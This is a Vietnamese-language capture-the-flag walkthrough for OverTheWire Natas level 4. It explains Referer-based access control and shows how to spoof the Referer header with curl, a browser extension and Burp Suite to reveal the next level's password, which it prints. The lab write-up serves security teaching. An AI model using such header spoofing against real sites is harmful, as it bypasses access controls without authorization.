# Level 4 -> Level 5

Access disallowed. You are visiting from "" while authorized users should come only from "http://natas5.natas.labs.overthewire.org/"

---

## 1. THÔNG TIN TRUY CẬP (DÙNG PASSWORD TÌM ĐƯỢC TỪ NATAS 3)

- **URL**: `http://natas4.natas.labs.overthewire.org`
- **Username**: `natas4`
- **Password**: `JDrPnuZAKyl6MkiqQGFIddrqpvgOASth`
- **Giao thức xác thực**: HTTP Basic Authentication

---

## 2. THỬ THÁCH & KIẾN THỨC NỀN TẢNG CỦA LEVEL 4

### Thử thách
Khi đăng nhập vào trang chủ, hệ thống từ chối cấp quyền và đưa ra cảnh báo:
> *"Access disallowed. You are visiting from "" while authorized users should come only from "http://natas5.natas.labs.overthewire.org/""*

*(Tạm dịch: Truy cập bị từ chối. Bạn đang truy cập từ nguồn rỗng `""`, trong khi người dùng được cấp phép bắt buộc phải đến từ "http://natas5.natas.labs.overthewire.org/")*

### Manh mối & Kiến thức cốt lõi: HTTP Header `Referer`

1. **HTTP Referer là gì?**:
   - Khi bạn nhấp vào một siêu liên kết (link) từ Trang A để chuyển sang Trang B, trình duyệt sẽ tự động gửi kèm một tiêu đề HTTP (HTTP Request Header) có tên là `Referer` với giá trị là địa chỉ của Trang A.
   - Nhờ header này, máy chủ của Trang B biết được bạn đã điều hướng đến từ website hay đường dẫn nào.
   - Khi bạn tự gõ URL vào thanh địa chỉ của trình duyệt hoặc bấm Refresh, trình duyệt sẽ không gửi header này, khiến máy chủ ghi nhận nguồn truy cập là rỗng (`""`).
   - *(Chi tiết thú vị: Trong văn bản đặc tả kỹ thuật RFC ban đầu, từ "Referrer" bị viết sai chính tả thành "Referer" và lỗi này được giữ lại thành chuẩn chung của Internet đến tận ngày nay).*

2. **Lỗ hổng bảo mật: Xác thực dựa trên Header của Client (Insecure Referer Validation)**:
   - Tất cả các HTTP Request Header (`User-Agent`, `Referer`, `Cookie`, `Host`...) đều do máy khách (trình duyệt hoặc phần mềm gửi request) tự tạo và gửi lên.
   - **Kẻ tấn công có toàn quyền chỉnh sửa và giả mạo (Spoofing) các header này** trước khi gói tin đến tay máy chủ.
   - Do đó, việc ứng dụng web tin tưởng mù quáng vào giá trị `Referer` để cấp quyền hoặc bảo vệ tài nguyên là một lỗ hổng kiểm soát truy cập (Broken Access Control) rất sơ hở.

---

## 3. CÔNG CỤ CẦN DÙNG

- **Dòng lệnh CLI (cURL)**: Công cụ tiện lợi nhất để tùy biến bất kỳ header HTTP nào.
- **Tiện ích mở rộng trên Trình duyệt (Browser Extension)**: Ví dụ *ModHeader* hoặc *Header Editor* giúp can thiệp header trực tiếp trong Chrome/Firefox/Edge.
- **Burp Suite**: Công cụ bắt và chỉnh sửa gói tin HTTP chuyên nghiệp.

---

## 4. CÁC BƯỚC THỰC HIỆN ĐỂ LẤY PASSWORD LEVEL 5

### Cách 1: Sử dụng dòng lệnh PowerShell / Terminal với cURL (Nhanh nhất & Đơn giản nhất)

Lệnh `curl` cung cấp sẵn tùy chọn `-e` (hoặc `--referer`) để chỉ định nguồn giới thiệu truy cập:

```powershell
curl.exe -s -u natas4:JDrPnuZAKyl6MkiqQGFIddrqpvgOASth -e "http://natas5.natas.labs.overthewire.org/" http://natas4.natas.labs.overthewire.org
```

*(Hoặc dùng cờ `-H` để thêm header tùy biến tương đương: `-H "Referer: http://natas5.natas.labs.overthewire.org/"`)*

**Đầu ra trả về từ máy chủ:**
```html
Access granted. The password for natas5 is e4z2Noy3oqwPJUWzJH0dseN67Cn1sy2M
```

---

### Cách 2: Sử dụng Trình duyệt kết hợp tiện ích chỉnh sửa Header (ModHeader)

Nếu bạn muốn thực hành trực quan trên trình duyệt:

- **Bước 1**: Cài đặt tiện ích mở rộng **ModHeader** (tìm trên Chrome Web Store hoặc Firefox Add-ons).

- **Bước 2**: Mở tiện ích ModHeader và thêm một dòng Request Header mới:
  - **Name**: `Referer`
  - **Value**:
    ```text
    http://natas5.natas.labs.overthewire.org/
    ```

- **Bước 3**: Truy cập vào trang web của bài:
  ```text
  http://natas4.natas.labs.overthewire.org
  ```
  Đăng nhập với tài khoản:
  - **User**: `natas4`
  - **Pass**: `JDrPnuZAKyl6MkiqQGFIddrqpvgOASth`

- **Bước 4**: Giờ đây trang web sẽ nhận diện bạn đến từ `natas5` và hiển thị mật khẩu ngay trên màn hình!

---

### Cách 3: Sử dụng Burp Suite

- **Bước 1**: Mở Burp Suite $\rightarrow$ Tab **Proxy** $\rightarrow$ Tab **Intercept** $\rightarrow$ chọn **Intercept is on**.
- **Bước 2**: Dùng trình duyệt nội bộ của Burp Suite truy cập:
  ```text
  http://natas4.natas.labs.overthewire.org
  ```
- **Bước 3**: Trong gói tin HTTP Request đang bị giữ lại tại Burp Suite, thêm một dòng vào phần headers:
  ```http
  Referer: http://natas5.natas.labs.overthewire.org/
  ```
- **Bước 4**: Bấm nút **Forward** để gửi gói tin đi. Mật khẩu sẽ xuất hiện trên trình duyệt.

---

## 5. KẾT QUẢ / MẬT KHẨU LEVEL 5

```text
Password natas5: [e4z2Noy3oqwPJUWzJH0dseN67Cn1sy2M]
```

